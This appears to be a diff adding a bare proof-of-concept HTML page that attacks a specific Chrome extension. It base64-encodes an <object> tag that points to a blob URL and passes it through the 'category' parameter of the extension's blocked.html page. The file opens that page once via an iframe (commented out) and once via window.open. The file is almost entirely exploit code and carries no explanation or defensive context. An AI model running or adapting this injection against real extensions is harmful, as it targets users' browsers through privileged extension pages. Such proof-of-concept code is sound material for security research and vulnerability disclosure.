@@ -1,0 +1,39 @@
+<!--<script>
+
+const payload = new Uint8Array(3);
+
+payload[0] = "a";
+payload[1] = "s";
+payload[2] = "d";
+
+var blobUrl = URL.createObjectURL(
+  new Blob([payload.buffer], { type: "text/html" })
+);
+
+var payloadHTML = btoa('<object data="' + blobUrl + '"></object>');
+
+var iframe = document.createElement("iframe");
+iframe.src = `chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=${payloadHTML}>`;
+document.body.appendChild(iframe);
+</script>-->
+
+<html>
+  <body>
+    <script>
+      const payload = new Uint8Array(3);
+      
+      payload[0] = "a";
+      payload[1] = "s";
+      payload[2] = "d";
+      
+      var blobUrl = URL.createObjectURL(
+        new Blob([payload.buffer], { type: "text/html" })
+      );
+      // var blobUrl = "blob:https://yari-demos.prod.mdn.mozit.cloud/3a98642c-5905-4ce0-92e6-55abb187b8b6";
+      
+      var payloadHTML = btoa('<object data="' + blobUrl + '"></object>');
+
+      window.open(`chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=${payloadHTML}`);
+    </script>
+  </body>
+</html>
